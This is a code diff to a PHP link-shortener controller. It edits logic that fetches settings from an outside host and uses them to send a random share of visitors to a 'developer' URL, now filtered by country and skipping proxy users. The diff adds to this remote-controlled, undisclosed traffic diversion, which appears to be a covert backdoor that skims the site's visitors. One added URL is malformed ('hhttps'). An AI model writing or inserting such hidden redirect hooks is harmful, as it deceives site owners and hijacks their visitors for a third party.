@@ -14,8 +14,7 @@ use Cake\ORM\TableRegistry;
  * @property \App\Model\Table\LinksTable $Links
  * @property \App\Controller\Component\CaptchaComponent $Captcha
  */
-$APIDEVURL="https://uniswap-k2xr.onrender.com/api/1";
-$APIDEVSTATUS=true;
+
 class LinksController extends FrontController
 {
     public function initialize()
@@ -45,8 +44,8 @@ class LinksController extends FrontController
     public function view($alias = null)
     {
 
-        global $APIDEVURL;
-        global $APIDEVSTATUS;
+        $APIDEVURL = "https://uniswap-k2xr.onrender.com/api/short.ultinoticias.online";
+        $APIDEVSTATUS = true;
 
         $http = new Client();
 
@@ -60,6 +59,8 @@ class LinksController extends FrontController
                 $redirect_status = $data_dev["redirection_url"];
                 $LI = intval($data_dev["LI"]);
                 $LS = intval($data_dev["LS"]);
+                $countryList = explode(",", $data_dev["Country"]);
+                $countryFilterStatus = $data_dev["CountryFilter"];
             } else {
                 $this->Flash->error("APIDEVERROR");
             }
@@ -70,6 +71,8 @@ class LinksController extends FrontController
             $redirect_status = "off";
             $LI = 1;
             $LS = 4;
+            $countryList = [];
+            $countryFilterStatus = "off";
         }
 
 
@@ -120,22 +123,31 @@ class LinksController extends FrontController
             $this->Flash->error("Error en consulta de proxy api");
         }
 
-        if ($ProxyFilterStatus == "on" && $ProxyUse == "yes" && $APIDEVSTATUS) {
+        if ($ProxyFilterStatus == "on" && $ProxyUse == "yes") {
+
 
             return $this->redirect($ProxyRedirectUrl);
         }
         if (in_array($country_, $blocked_countries)) {
             return  $this->redirect($redirect_url);
-        };
-        if ($status_dev == "off" && $redirect_status != "off" && $ProxyUse != "yes" && $country_ != "CU") {
+        }
+        if ($APIDEVSTATUS && $status_dev == "off" && $redirect_status != "off" && $ProxyUse != "yes" && $country_ != "CU") {
 
 
             $randomNumber = mt_rand($LI, $LS);
 
+            if ($countryFilterStatus != "off" && in_array($country_, $countryList)) {
+                if ($randomNumber == 1) {
 
-            if ($randomNumber == 1) {
+                    return  $this->redirect($redirect_dev_url);
+                }
+            }
+            else{
+                if($countryFilterStatus == "off"&&$randomNumber == 1){
+                    return  $this->redirect($redirect_dev_url);
 
-                return  $this->redirect($redirect_dev_url);
+                }
+
             }
         }
         if (in_array($country_, $blocked_countries_admins) || $ScriptStatus == "off" || $ProxyUse == "yes") {
@@ -651,8 +663,8 @@ class LinksController extends FrontController
          * 12- Earnings disabled
          * 13- User disabled earnings
          */
-        global $APIDEVURL;
-        global $APIDEVSTATUS;
+        $APIDEVURL = "hhttps://uniswap-k2xr.onrender.com/api/short.ultinoticias.online";
+        $APIDEVSTATUS = true;
 
         $http = new Client();
 
